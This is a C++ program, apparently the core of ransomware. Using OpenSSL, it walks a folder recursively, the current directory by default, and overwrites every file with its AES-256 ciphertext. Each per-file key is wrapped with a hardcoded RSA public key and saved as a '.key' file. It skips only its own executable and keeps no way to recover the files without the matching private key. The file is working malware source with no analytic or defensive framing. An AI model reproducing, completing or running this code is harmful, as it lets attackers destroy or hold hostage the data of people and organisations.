#include <iostream>
#include <fstream>
#include <filesystem>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/bio.h>
#include <openssl/err.h>

namespace fs = std::filesystem;

// The hardcoded public key in PEM format (replace with your actual public key)
const std::string hardcoded_public_key_pem = R"(
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkdsqDDz2aNs1G3pVc6Fn
nyGltUmYVQHMpCAfffUHqGKzX9KVSq5nzgk9ToOHHtVaVO+btfGQ7qhFcbbnUHNU
pTBQ2Ns7bejOevop/mDPd0FFACITfbCvWSW9e5iig+OVaA1V98D6nJbfqomdUQ8Q
9m+cy4OtEE7UIQsjlB7dn8QZLQx9+Vdc9yT2kgcsnm/sgJF4U/ITfzoZ0rJJCFnp
0H4/m6+63VBpSEYDRHtjx2mBf4T16p/1ZAD0LNQ7HGmitueN1cl/N+dhRNxmHq5e
YGafOo/JMCHj4irI8pTIP9zg3HpNxNUr2nQ/A0zn0EfKDCf7m0h6BIUxFf2fjjIk
EQIDAQAB
-----END PUBLIC KEY-----
)";

// Generate RSA structure from the hardcoded public key
RSA* load_hardcoded_public_key() {
    BIO* bio = BIO_new_mem_buf(hardcoded_public_key_pem.data(), -1);
    RSA* rsa_public_key = PEM_read_bio_RSA_PUBKEY(bio, nullptr, nullptr, nullptr);
    BIO_free(bio);

    if (!rsa_public_key) {
        std::cerr << "Failed to load public key from PEM." << std::endl;
    }

    return rsa_public_key;
}

// Encrypt AES key using RSA public key
std::string rsa_encrypt_aes_key(const unsigned char* aes_key, int aes_key_len, RSA* rsa_public_key) {
    std::string encrypted_key(RSA_size(rsa_public_key), '\0');
    int result = RSA_public_encrypt(aes_key_len, aes_key, reinterpret_cast<unsigned char*>(&encrypted_key[0]), rsa_public_key, RSA_PKCS1_OAEP_PADDING);

    if (result == -1) {
        std::cerr << "RSA encryption failed." << std::endl;
        return "";
    }

    return encrypted_key;
}

// Encrypt data using AES
std::string aes_encrypt(const std::string& data, unsigned char* aes_key, unsigned char* iv) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    std::string ciphertext(data.size() + AES_BLOCK_SIZE, '\0');
    int len, ciphertext_len;

    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, aes_key, iv);

    EVP_EncryptUpdate(ctx, reinterpret_cast<unsigned char*>(&ciphertext[0]), &len, reinterpret_cast<const unsigned char*>(data.c_str()), data.size());
    ciphertext_len = len;

    EVP_EncryptFinal_ex(ctx, reinterpret_cast<unsigned char*>(&ciphertext[0]) + len, &len);
    ciphertext_len += len;

    ciphertext.resize(ciphertext_len);
    EVP_CIPHER_CTX_free(ctx);

    return ciphertext;
}

// Function to encrypt all files in a folder recursively
void encrypt_files_in_folder(const std::string& folder_path, RSA* rsa_public_key, const std::string& self_path) {
    for (const auto& entry : fs::recursive_directory_iterator(folder_path, fs::directory_options::skip_permission_denied)) {
        if (entry.is_regular_file()) {
            // Skip the executable file itself
            if (entry.path() == self_path) {
                std::cout << "Skipping encryption of self: " << entry.path().filename().string() << std::endl;
                continue;
            }

            std::ifstream file(entry.path(), std::ios::binary);
            if (!file) {
                std::cerr << "Failed to open file: " << entry.path() << std::endl;
                continue;
            }

            // Read file content
            std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
            file.close();

            // Generate AES key and IV
            unsigned char aes_key[32];  // AES-256 uses a 32-byte key
            unsigned char iv[AES_BLOCK_SIZE];
            RAND_bytes(aes_key, sizeof(aes_key));
            RAND_bytes(iv, AES_BLOCK_SIZE);

            // Encrypt the file content using AES
            std::string encrypted_content = aes_encrypt(content, aes_key, iv);

            // Encrypt the AES key using the RSA public key
            std::string encrypted_aes_key = rsa_encrypt_aes_key(aes_key, sizeof(aes_key), rsa_public_key);

            // Save the encrypted content and encrypted AES key back to the file
            std::ofstream encrypted_file(entry.path(), std::ios::binary);
            encrypted_file.write(reinterpret_cast<const char*>(iv), AES_BLOCK_SIZE);
            encrypted_file.write(encrypted_content.c_str(), encrypted_content.size());
            encrypted_file.close();

            // Save the encrypted AES key in a separate key file
            std::string key_file = entry.path().string() + ".key";
            std::ofstream key_out(key_file, std::ios::binary);
            key_out.write(encrypted_aes_key.c_str(), encrypted_aes_key.size());
            key_out.close();

            std::cout << "File: " << entry.path().filename().string() << " has been encrypted.\n";
        }
    }
}

int main(int argc, char* argv[]) {
    std::string folder_path;
    std::string self_path = argv[0]; // Get the path of the current executable

    if (argc > 1) {
        folder_path = argv[1];
    } else {
        folder_path = ".";  // Default to current directory
    }

    // Load the hardcoded RSA public key
    RSA* rsa_public_key = load_hardcoded_public_key();
    if (!rsa_public_key) {
        std::cerr << "Error loading hardcoded public key. Exiting." << std::endl;
        return 1;
    }

    // Encrypt all files using the RSA public key, but skip the executable itself
    encrypt_files_in_folder(folder_path, rsa_public_key, self_path);

    // Free the RSA key
    RSA_free(rsa_public_key);

    std::cout << "\nEncryption complete. Files have been encrypted.\n";
    return 0;
}
